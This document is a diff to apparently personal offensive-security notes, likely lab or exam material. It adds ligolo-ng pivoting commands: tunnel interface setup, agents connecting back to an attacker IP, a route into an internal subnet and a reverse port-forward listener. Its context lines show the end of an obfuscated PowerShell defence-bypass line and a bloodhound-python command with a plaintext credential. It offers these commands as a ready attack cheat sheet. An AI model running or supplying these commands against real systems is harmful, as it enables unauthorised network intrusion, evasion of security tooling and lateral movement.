@@ -166,3 +166,26 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F
 bloodhound-python -d 'LAB.TRUSTED.VL' -u 'rsmith' -p 'IHateEric2' -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all --zip
 '''
 
+
+
+```
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+
+./proxy -selfcert
+```
+
+```
+./agent.exe -connect 192.168.45.220:11601 -ignore-cert
+./agent -connect 192.168.45.220:11601 -ignore-cert
+```
+
+```bash
+ip route add 172.16.193.0/24 dev ligolo
+```
+
+###Reverse Port Forwarding
+```bash
+listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444 --tcp
+```
+
